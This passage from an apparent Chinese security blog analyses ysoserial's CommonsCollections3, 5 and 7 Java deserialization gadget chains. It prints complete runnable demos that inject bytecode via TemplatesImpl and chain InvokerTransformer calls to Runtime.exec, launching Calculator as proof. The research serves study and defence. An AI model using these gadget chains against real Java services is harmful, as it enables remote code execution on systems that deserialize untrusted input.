class="title">getName</span>())</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//插入代码</span></span><br><span class="line">clazz.makeClassInitializer().insertAfter(cmd);</span><br><span class="line"></span><br><span class="line"><span class="comment">//设置其父类</span></span><br><span class="line">CtClass superC = pool.get(AbstractTranslet<span class="class">.<span class="keyword">class</span>.<span class="title">getName</span>())</span>;</span><br><span class="line">clazz.setSuperclass(superC);</span><br><span class="line"></span><br><span class="line"><span class="comment">//将其转化为字节码        </span></span><br><span class="line"><span class="keyword">byte</span>[] classBytes = clazz.toBytecode();        </span><br></pre></td></tr></table></figure>

<p>到此为止，恶意类构造完了，接下来需要的是保证反序列化链中的相应的函数能够被调用到，由于可控的是TemplatesImpl，从与它相关的函数调用分析。在newTransformer()函数中，调用了getTransletInstance()函数，在这之前没有其他分支，进入此函数。首先<code>_name</code>成员变量不能为空，否则直接返回null。其次<code>_class</code>成员变量必须为空才能进入<code>defineTransletClasses()</code>函数。进入此函数，可以看到首先<code>_bytecodes</code>函数不能为空，然后在生成loader对象时，需要对<code>_tfactory</code>成员变量赋值。其次，在从字节码中加载了类之后，会判断其父类必须等同于<code>ABSTRACT_RANSLET</code>。这就是为什么上面的代码中会对其父类进行设置。</p>
<p>对于TemplatesImpl的其他设置如下:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//生成一个TemplatesImpl对象</span></span><br><span class="line">Object templates = Class.forName(<span class="string">"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl"</span>).newInstance();</span><br><span class="line"></span><br><span class="line"><span class="comment">//获得TemplatesImpl的成员变量，将_bytecodes设置为此类的bytecode</span></span><br><span class="line">Field field = templates.getClass().getDeclaredField(<span class="string">"_bytecodes"</span>);</span><br><span class="line">field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">field.set(templates,<span class="keyword">new</span> <span class="keyword">byte</span>[][] &#123;classBytes,classFiles.classAsBytes(Foo<span class="class">.<span class="keyword">class</span>)&#125;)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//获得TemplatesImpl的成员变量，将_name设置为任意不为空的值。ysoserial在这里对name设置的是一个随机值，为了重复使用。</span></span><br><span class="line">Field field2 = templates.getClass().getDeclaredField(<span class="string">"_name"</span>);</span><br><span class="line">field2.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">field2.set(templates,<span class="string">"ananaskr"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//获得TemplatesImpl的成员变量，设置_tfactory。</span></span><br><span class="line">Field field3 = templates.getClass().getDeclaredField(<span class="string">"_tfactory"</span>);</span><br><span class="line">        field3.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        field3.set(templates, TransformerFactoryImpl<span class="class">.<span class="keyword">class</span>.<span class="title">newInstance</span>())</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<blockquote>
<p>在这里出现了一个Foo.class。事实上_bytecodes是一个byte[][]。需要2个class的字节码，Foo.class就是一个实现了Serializable的空类。</p>
</blockquote>
<h2 id="完整demo"><a href="#完整demo" class="headerlink" title="完整demo"></a>完整demo</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassClassPath;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InstantiateTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.*;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">StubTransletPayload</span> <span class="keyword">extends</span> <span class="title">AbstractTranslet</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = -<span class="number">5971610431559700674L</span>;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException </span>&#123;&#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException</span>&#123;&#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">Foo</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = <span class="number">8207363842866235160L</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        String command = <span class="string">"/Applications/Calculator.app/Contents/MacOS/Calculator"</span>;</span><br><span class="line">        String cmd = <span class="string">"java.lang.Runtime.getRuntime().exec(\""</span> +</span><br><span class="line">                command.replaceAll(<span class="string">"\\\\"</span>,<span class="string">"\\\\\\\\"</span>).replaceAll(<span class="string">"\""</span>, <span class="string">"\\\""</span>) +</span><br><span class="line">                <span class="string">"\");"</span>;</span><br><span class="line"></span><br><span class="line">        Object templates = Class.forName(<span class="string">"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl"</span>).newInstance();</span><br><span class="line"></span><br><span class="line">        ClassPool pool = ClassPool.getDefault();</span><br><span class="line">        pool.insertClassPath(<span class="keyword">new</span> ClassClassPath(StubTransletPayload<span class="class">.<span class="keyword">class</span>))</span>;</span><br><span class="line">        pool.insertClassPath(<span class="keyword">new</span> ClassClassPath(AbstractTranslet<span class="class">.<span class="keyword">class</span>))</span>;</span><br><span class="line">        CtClass clazz = pool.get(StubTransletPayload<span class="class">.<span class="keyword">class</span>.<span class="title">getName</span>())</span>;</span><br><span class="line"></span><br><span class="line">        clazz.makeClassInitializer().insertAfter(cmd);</span><br><span class="line">        CtClass superC = pool.get(AbstractTranslet<span class="class">.<span class="keyword">class</span>.<span class="title">getName</span>())</span>;</span><br><span class="line">        clazz.setSuperclass(superC);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">byte</span>[] classBytes = clazz.toBytecode();</span><br><span class="line"></span><br><span class="line">        Field field = templates.getClass().getDeclaredField(<span class="string">"_bytecodes"</span>);</span><br><span class="line">        field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        field.set(templates,<span class="keyword">new</span> <span class="keyword">byte</span>[][] &#123;classBytes,classFiles.classAsBytes(Foo<span class="class">.<span class="keyword">class</span>)&#125;)</span>;</span><br><span class="line"></span><br><span class="line">        Field field2 = templates.getClass().getDeclaredField(<span class="string">"_name"</span>);</span><br><span class="line">        field2.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        field2.set(templates,<span class="string">"ananaskr12345"</span>);</span><br><span class="line"></span><br><span class="line">        Field field3 = templates.getClass().getDeclaredField(<span class="string">"_tfactory"</span>);</span><br><span class="line">        field3.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        field3.set(templates, TransformerFactoryImpl<span class="class">.<span class="keyword">class</span>.<span class="title">newInstance</span>())</span>;</span><br><span class="line"></span><br><span class="line">        Transformer[] transformer = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(TrAXFilter<span class="class">.<span class="keyword">class</span>),</span></span><br><span class="line">                new InstantiateTransformer(new Class[] &#123;Templates.class&#125;, new Object[] &#123;templates&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        ChainedTransformer chainedTransformer = <span class="keyword">new</span> ChainedTransformer(transformer);</span><br><span class="line"></span><br><span class="line">        Map map = <span class="keyword">new</span> HashMap();</span><br><span class="line">        Map lazyMap = LazyMap.decorate(map,chainedTransformer);</span><br><span class="line">        ClassLoader loader = lazyMap.getClass().getClassLoader();</span><br><span class="line">        Class[] interfaces = lazyMap.getClass().getInterfaces();</span><br><span class="line"></span><br><span class="line">        Constructor ctor = Class.forName(<span class="string">"sun.reflect.annotation.AnnotationInvocationHandler"</span>).getDeclaredConstructors()[<span class="number">0</span>];</span><br><span class="line">        ctor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        InvocationHandler handler = (InvocationHandler) ctor.newInstance(Override<span class="class">.<span class="keyword">class</span>,<span class="title">lazyMap</span>)</span>;</span><br><span class="line"></span><br><span class="line">        Map mapProxy = (Map) Proxy.newProxyInstance(loader,interfaces,handler);</span><br><span class="line"></span><br><span class="line">        Constructor cttor = Class.forName(<span class="string">"sun.reflect.annotation.AnnotationInvocationHandler"</span>).getDeclaredConstructors()[<span class="number">0</span>];</span><br><span class="line">        cttor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        InvocationHandler handler1 = (InvocationHandler) ctor.newInstance(Override<span class="class">.<span class="keyword">class</span>,<span class="title">mapProxy</span>)</span>;</span><br><span class="line">        </span><br><span class="line">        ByteArrayOutputStream baos = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream out = <span class="keyword">new</span> ObjectOutputStream(baos);</span><br><span class="line">        out.writeObject(handler1);</span><br><span class="line">        out.flush();</span><br><span class="line">        out.close();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">byte</span>[] bytes = baos.toByteArray();</span><br><span class="line"></span><br><span class="line">        ByteArrayInputStream bais = <span class="keyword">new</span> ByteArrayInputStream(bytes);</span><br><span class="line">        ObjectInputStream in = <span class="keyword">new</span> ObjectInputStream(bais);</span><br><span class="line">        in.readObject();</span><br><span class="line">        in.close();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>其中对Foo.class转换为bytecode的代码，直接使用了ysoserial中的<code>ClassFiles</code>。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">classFiles</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">classAsFile</span><span class="params">(<span class="keyword">final</span> Class&lt;?&gt; clazz)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> classAsFile(clazz, <span class="keyword">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">classAsFile</span><span class="params">(<span class="keyword">final</span> Class&lt;?&gt; clazz, <span class="keyword">boolean</span> suffix)</span> </span>&#123;</span><br><span class="line">        String str;</span><br><span class="line">        <span class="keyword">if</span> (clazz.getEnclosingClass() == <span class="keyword">null</span>) &#123;</span><br><span class="line">            str = clazz.getName().replace(<span class="string">"."</span>, <span class="string">"/"</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            str = classAsFile(clazz.getEnclosingClass(), <span class="keyword">false</span>) + <span class="string">"$"</span> + clazz.getSimpleName();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (suffix) &#123;</span><br><span class="line">            str += <span class="string">".class"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> str;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">byte</span>[] classAsBytes(<span class="keyword">final</span> Class&lt;?&gt; clazz) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">final</span> <span class="keyword">byte</span>[] buffer = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">1024</span>];</span><br><span class="line">            <span class="keyword">final</span> String file = classAsFile(clazz);</span><br><span class="line">            <span class="keyword">final</span> InputStream in = classFiles<span class="class">.<span class="keyword">class</span>.<span class="title">getClassLoader</span>().<span class="title">getResourceAsStream</span>(<span class="title">file</span>)</span>;</span><br><span class="line">            <span class="keyword">if</span> (in == <span class="keyword">null</span>) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> IOException(<span class="string">"couldn't find '"</span> + file + <span class="string">"'"</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">final</span> ByteArrayOutputStream out = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">            <span class="keyword">int</span> len;</span><br><span class="line">            <span class="keyword">while</span> ((len = in.read(buffer)) != -<span class="number">1</span>) &#123;</span><br><span class="line">                out.write(buffer, <span class="number">0</span>, len);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> out.toByteArray();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> RuntimeException(e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>运行结果如下:</p>
<p><img src="6.png" alt=""></p>
<p>可以看到弹出计算器的同时，也出现了一些报错信息。对于这些报错信息，ysoserial作者回应，在很多payload中会有这些错误的出现，但并不影响代码的执行。可参考<a href="https://github.com/frohoff/ysoserial/issues/69" target="_blank" rel="noopener">https://github.com/frohoff/ysoserial/issues/69</a>。</p>
<p><img src="7.jpeg" alt=""></p>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ul>
<li><a href="https://www.cnblogs.com/tr1ple/p/12201553.html#toc-1" target="_blank" rel="noopener">从0到1掌握某Json-TemplatesImpl链与ysoserial-jdk7u21的前因后果</a></li>
<li><a href="http://blog.0kami.cn/2019/10/28/study-java-deserialized-commonscollections3-3/" target="_blank" rel="noopener">Java反序列化利用链挖掘之CommonsCollections3</a></li>
</ul>
]]></content>
      <categories>
        <category>JAVA安全</category>
      </categories>
      <tags>
        <tag>CommonsCollections</tag>
      </tags>
  </entry>
  <entry>
    <title>ysoserial分析之CommonsCollections5</title>
    <url>/2020/04/26/ysoserial-analyze-5/</url>
    <content><![CDATA[<p>这篇文章分析的是CommonsCollections5，把它与CommonsCollections1进行对比的话，最外层的类由<code>AnnotationInvocationHandler</code>变成了<font color=#008000><code>BadAttributeValueExpException</code></font>。最终的目标都是要触发<code>LazyMap.get</code>函数。</p>
<a id="more"></a>

<p>前面已经分析过<br><a href="https://ananaskr.github.io/2020/04/20/ysoserial-analyze/" target="_blank" rel="noopener">ysoserial分析之CommonsCollections1</a><br><a href="https://ananaskr.github.io/2020/04/24/ysoserial-analyze-2/" target="_blank" rel="noopener">ysoserial分析之CommonsCollections2</a><br><a href="https://ananaskr.github.io/2020/04/23/ysoserial-analyze-3/" target="_blank" rel="noopener">ysoserial分析之CommonsCollections3</a><br><a href="https://ananaskr.github.io/2020/04/26/ysoserial-analyze-4/" target="_blank" rel="noopener">ysoserial分析之CommonsCollections4</a></p>
<p>使用此payload进行利用时，需要未配置security-manager。来看看整个的利用链:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">BadAttributeValueExpException.readObject()</span><br><span class="line">  -&gt;TiedMapEntry.toString()</span><br><span class="line">    -&gt;LazyMap.get()</span><br><span class="line">      -&gt;ChainedTransformer.transform()</span><br><span class="line">        -&gt;ConstantTransformer.transform()</span><br><span class="line">        -&gt;InvokerTransformer.transform()</span><br></pre></td></tr></table></figure>


<h2 id="利用链分析"><a href="#利用链分析" class="headerlink" title="利用链分析"></a>利用链分析</h2><p>为了要触发LazyMap.get函数，就必须找一个类，该类满足2个条件:1)类可序列化，类属性又个可控的Map或Object；2)该类的类函数上调用了Map.get。CommonsCollections5在这里用到了<code>TiedMapEntry</code>类</p>
<p><img src="2.png" alt=""></p>
<p>该类有Map成员变量，且在getValue方法中调用了Map.get。现在的问题就变成了如何调用getValue方法。可以知道的是该类的toString、hashCode、equals均调用到了getValue函数。在这个利用链中利用的是toString函数。这里介绍一个类<code>BadAttributeValueException</code>。在它的readObject方法中调用了toString()函数。</p>
<p><img src="1.png" alt=""></p>
<p>首先定位到BadAttributeValueException类的readObject方法。可以看到当System.getSecurityManager为null或者当valObj是这7种类型之一的时，会调用<code>toString()</code>函数。很显然valObj的类型是TiedMapEntry，所以需要未对security-manager进行配置。  </p>
<h2 id="payload构造"><a href="#payload构造" class="headerlink" title="payload构造"></a>payload构造</h2><p>那么现在很自然地可以想到，实例化一个TiedMapEntry类，类属性为构造好的LazyMap。那么代码如下所示:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">Transformer chainedTransformer = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line">Map beforemap = <span class="keyword">new</span> HashMap();</span><br><span class="line">Map lazyMap = LazyMap.decorate(beforemap,chainedTransformer);</span><br><span class="line"></span><br><span class="line">TiedMapEntry tiedMapEntry = <span class="keyword">new</span> TiedMapEntry(lazyMap,<span class="number">1</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>那么如何获取到valObj呢？查看BadAttributeValueException类readObject函数中，可以看到valObj是获取了BadAttributeValueException属性中的”val”属性。因此，需要将TiedMapEntry类作为BadAttributeValueException实例中的的val属性。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">BadAttributeValueExpException val = <span class="keyword">new</span> BadAttributeValueExpException(<span class="keyword">null</span>);</span><br><span class="line">Field valField = val.getClass().getDeclaredField(<span class="string">"val"</span>);</span><br><span class="line">valField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">valField.set(val,tiedMapEntry);</span><br></pre></td></tr></table></figure>

<p>整个demo如下所示:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.*;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime<span class="class">.<span class="keyword">class</span>),</span></span><br><span class="line">                new InvokerTransformer("getMethod",new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;"getRuntime",new Class[0]&#125;),</span><br><span class="line">                new InvokerTransformer("invoke",new Class[]&#123;Object.class,Object[].class&#125;,new Object[]&#123;null,null&#125;),</span><br><span class="line">                new InvokerTransformer("exec",new Class[]&#123;String.class&#125;,new Object[]&#123;"/Applications/Calculator.app/Contents/MacOS/Calculator"&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        Transformer chainedTransformer = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line">        Map beforemap = <span class="keyword">new</span> HashMap();</span><br><span class="line">        Map lazyMap = LazyMap.decorate(beforemap,chainedTransformer);</span><br><span class="line"></span><br><span class="line">        TiedMapEntry tiedMapEntry = <span class="keyword">new</span> TiedMapEntry(lazyMap,<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        BadAttributeValueExpException val = <span class="keyword">new</span> BadAttributeValueExpException(<span class="keyword">null</span>);</span><br><span class="line">        Field valField = val.getClass().getDeclaredField(<span class="string">"val"</span>);</span><br><span class="line">        valField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        valField.set(val,tiedMapEntry);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">         ByteArrayOutputStream baos = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">         ObjectOutputStream out = <span class="keyword">new</span> ObjectOutputStream(baos);</span><br><span class="line">         out.writeObject(val);</span><br><span class="line">         out.flush();</span><br><span class="line">         out.close();</span><br><span class="line"></span><br><span class="line">         <span class="keyword">byte</span>[] bytes = baos.toByteArray();</span><br><span class="line"></span><br><span class="line">         ByteArrayInputStream bais = <span class="keyword">new</span> ByteArrayInputStream(bytes);</span><br><span class="line">         ObjectInputStream in = <span class="keyword">new</span> ObjectInputStream(bais);</span><br><span class="line">         in.readObject();</span><br><span class="line">         in.close();</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>结果如下图所示:<br><img src="3.png" alt=""></p>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ul>
<li><a href="https://www.cnblogs.com/tr1ple/p/12411357.html" target="_blank" rel="noopener">java反序列化-ysoserial-调试分析总结篇(5)</a></li>
</ul>
]]></content>
      <categories>
        <category>JAVA安全</category>
      </categories>
      <tags>
        <tag>CommonsCollections</tag>
      </tags>
  </entry>
  <entry>
    <title>ysoserial分析之CommonsCollections7</title>
    <url>/2020/04/27/ysoserial-analyze-7/</url>
    <content><![CDATA[<p>这篇文章分析的CommonsCollections7。这篇文章主要介绍了利用<font color=#008000>Hash碰撞</font>的方式来触发LazyMap.get函数，从而调用到transform函数，执行任意命令。</p>
<a id="more"></a>

<p>前面已经分析过:<br><a href="https://ananaskr.github.io/2020/04/20/ysoserial-analyze/" target="_blank" rel="noopener">ysoserial分析之CommonsCollections1</a><br><a href="https://ananaskr.github.io/2020/04/24/ysoserial-analyze-2/" target="_blank" rel="noopener">ysoserial分析之CommonsCollections2</a><br><a href="https://ananaskr.github.io/2020/04/23/ysoserial-analyze-3/" target="_blank" rel="noopener">ysoserial分析之CommonsCollections3</a><br><a href="https://ananaskr.github.io/2020/04/26/ysoserial-analyze-4/" target="_blank" rel="noopener">ysoserial分析之CommonsCollections4</a><br><a href="https://ananaskr.github.io/2020/04/26/ysoserial-analyze-5/" target="_blank" rel="noopener">ysoserial分析之CommonsCollections5</a><br><a href="https://ananaskr.github.io/2020/04/27/ysoserial-analyze-6/" target="_blank" rel="noopener">ysoserial分析之CommonsCollections6</a>  </p>
<p>CommonsCollections7与前面的CommonsCollections5，6的不同点挺多的。它使用了<code>hash碰撞</code>的方式来触发LazyMap.get函数。而在最外层使用的是<code>Hashtable</code>来触发其readObject函数。它整个的利用链如下所示:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">HashTable.readObject()</span><br><span class="line">  -&gt;HashTable.reconstitutionPut()</span><br><span class="line">  	-&gt;AbstractMapDecorator.equals()</span><br><span class="line">  	  -&gt;AbstractMap.equals()</span><br><span class="line">  	    -&gt;LazyMap.get()</span><br><span class="line">  	      -&gt;ChainedTransformer.transform()</span><br><span class="line">  	        -&gt;ConstantTransformer.transform()</span><br><span class="line">  	        -&gt;InvokerTransformer.transform()</span><br></pre></td></tr></table></figure>

<h2 id="利用链分析"><a href="#利用链分析" class="headerlink" title="利用链分析"></a>利用链分析</h2><p>由于从LazyMap.get到最后的整个过程之前都已经分析过。这里我们就分析LazyMap.get往前的利用链。</p>
<p>考虑到需要触发LazyMap.get函数，根据以往的想法，需要找到一个具有这样条件的类：1）该类可以被反序列化。2）该类调用了LazyMap.get()或者Map.get()或者Object。get()。但是这条利用链比较特殊，它用到了hash碰撞。我们从头开始分析，首先定位到HashTable的readObject函数。</p>
<p><img src="1.png" alt=""></p>
<p>可以看到在最后有一个<code>reconstitutionPut</code>函数。跟进这个函数</p>
<p><img src="2.png" alt=""></p>
<p>该函数收看会填充table的内容，然后在if判断中，首先<code>e.hash==hash</code>为真，才会进入<code>e.key.equals(key)</code>的判断。跟进equals，这里的equals函数取决于key的类型，在利用链中利用的是LazyMap对象，它调用的其父类AbstractMapDecorator的equals函数。</p>
<p><img src="3.png" alt=""></p>
<p>在这个equals函数中，又调用了map的equals函数，这里实际调用的是HashMap的父类<code>AbstractMap</code>的equals函数。跟进这个equals函数，可以发现在里面调用了<code>m.get(key)</code>。此时只需要让m为LazyMap对象即可。</p>
<h2 id="payload构造"><a href="#payload构造" class="headerlink" title="payload构造"></a>payload构造</h2><p>从Hashtables.readObject函数中进入reconstitutionPut，这个函数中会在<code>tab</code>中存入<code>&lt;key,value&gt;</code>的entry，它会通过hash计算当前存放的entry在tab中的位置，若key的hash值一样，那么位置就一样，就会进入if判断。这时候会先比较下一个entry与当前key的hash值是否一样，若一致，则进入<code>e.key.equals(key)</code>。</p>
<p>那么首先就需要解决如何进入<code>e.key.equals(key)</code>。在Hashtable中放入2个entry，其key是一致的。进而进入<code>e.key.equals(key)</code>。这里选择放置两个LazyMap对象作为key。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Map innerMap1 = <span class="keyword">new</span> HashMap();</span><br><span class="line">Map innerMap2 = <span class="keyword">new</span> HashMap();</span><br><span class="line"></span><br><span class="line">Map lazymap1 = LazyMap.decorate(innerMap1,chainedTransformer);</span><br><span class="line">lazymap1.put(<span class="string">"yy"</span>,<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">Map lazymap2 = LazyMap.decorate(innerMap2,chainedTransformer);</span><br><span class="line">lazymap2.put(<span class="string">"zz"</span>,<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">Hashtable hashtable = <span class="keyword">new</span> Hashtable();</span><br><span class="line">hashtable.put(lazymap1,<span class="number">1</span>);</span><br><span class="line">hashtable.put(lazymap2,<span class="number">2</span>);</span><br></pre></td></tr></table></figure>

<p>进入equals函数，进一步分析为什么放入的是这样的key。此时的key作为参数传入了equals函数。由于<code>e.key</code>是一个lazyMap，应该调用的是LazyMap的equals函数，而LazyMap继承了AbstractMapDecorator类且并未重写equals函数，因此调用的是<code>AbstractMapDecorator</code>类的equals函数。</p>
<p>但是从AbstractMapDecorator类的equals函数接着就调用到了AbstractMap类的equals函数不是很能理解，猜测可能是因为AbstractMapDecorator是AbstractMap类的一个装饰类，因此调用的是AbstractMap类的equals方法。它会首先判断传入的key是否是AbstractMapDecorator实例，不是则调用AbstractMap类的equals方法。  </p>
<p>进入AbstractMap的equals方法。同样传入的参数是一开始的key，这个key会转化为一个Map类型对象m。这个m在接下来调用了<code>m.get(key)</code>。在利用链中可以知道，这个m必须为LazyMap对象，即前面的Hashtable的entry中的key是LazyMap对象。</p>
<p><img src="5.png" alt=""></p>
<p>在这里需要满足两个Lazymap对象的size是一致的，且这里需要满足value不为null，才能调用到<code>m.get(key)</code>。看起来似乎就是满足的。事实上，查看ysoserial的payload，可以发现有如下操作。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">lazyMap2.remove(&quot;yy&quot;);</span><br></pre></td></tr></table></figure>

<p>这里是因为Hashtable在放入第二个LazyMap时，由于两个hash值相同，继续调用到LazyMap.get的时候。会将第一个LazyMap的key，value值放入第二个中。</p>
<p><img src="6.png" alt=""></p>
<p>到这里整个payload构造完毕，完整的demo如下所示:</p>
